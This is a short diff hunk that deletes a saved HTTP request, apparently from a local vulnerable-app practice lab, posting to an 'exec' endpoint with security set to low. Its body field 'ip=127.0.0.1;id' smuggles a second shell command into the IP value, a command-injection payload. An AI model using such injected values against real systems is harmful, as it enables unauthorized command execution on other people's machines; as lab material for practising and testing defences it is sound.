@@ -1,4 +1,0 @@
-POST http://localhost:8081/vulnerabilities/exec/
-Cookie: PHPSESSID=(lab session); security=low
-
-ip=127.0.0.1;id&Submit=Submit
